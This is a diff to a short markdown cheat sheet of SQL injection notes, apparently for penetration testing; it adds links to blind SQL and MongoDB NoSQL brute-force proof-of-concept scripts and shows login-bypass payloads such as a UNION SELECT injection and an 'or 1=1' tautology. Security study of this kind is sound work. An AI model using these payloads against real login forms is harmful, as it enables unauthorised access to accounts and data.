@@ -1,5 +1,7 @@
 # SQLi notes
 
+#### Example PoCs: [BlindSQLI Brute](https://github.com/kymb0/General_code_repo/blob/master/Code_templates/bruteforce_blindsqli.py) [BlindNOsqli Brute](https://github.com/kymb0/General_code_repo/blob/master/Code_templates/brute_mongoDB_nosqli.py)
+
 #### Bypass login
 `admin' UNION SELECT 'pass' AS password FROM admins WHERE '1' = '1` in username field and then `pass` in password field  
 `' or 1 =1 LIMIT 1,1#`
